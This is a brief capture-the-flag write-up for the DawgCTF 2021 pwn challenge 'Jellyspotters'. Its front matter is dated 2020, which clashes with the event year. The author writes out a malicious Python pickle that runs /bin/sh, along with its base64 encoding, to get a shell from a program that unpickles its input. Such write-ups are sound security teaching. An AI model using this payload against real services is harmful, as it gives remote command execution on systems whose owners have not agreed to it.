---
title: Jellyspotters
date: 2020-05-08
excerpt: "'Jellyspotters' was a challenge in the Pwn category of DawgCTF 2021"
classes: wide
categories: dawgctf2021
tags:
  - dawgctf2021
  - pwn
  - python
  - pickle
  - base64
---


![img](/assets/images/ctf/dawgctf2021-jellyspotters/0.png)


![img](/assets/images/ctf/dawgctf2021-jellyspotters/1.png)

The interesting function is `import`

Breaking the `import` function gives us an error


![img](/assets/images/ctf/dawgctf2021-jellyspotters/2.png)

So it wants a **base64** encoded pickle object and we need to read the flag. Let's get a shell using a malicious pickle object.

reading: https://checkoway.net/musings/pickle/

```
cos
system
(S'/bin/sh'
tR.
```

base64 encoding that gives us

`Y29zCnN5c3RlbQooUycvYmluL3NoJwp0Ui4=`

and passing that to the program...


![img](/assets/images/ctf/dawgctf2021-jellyspotters/3.png)
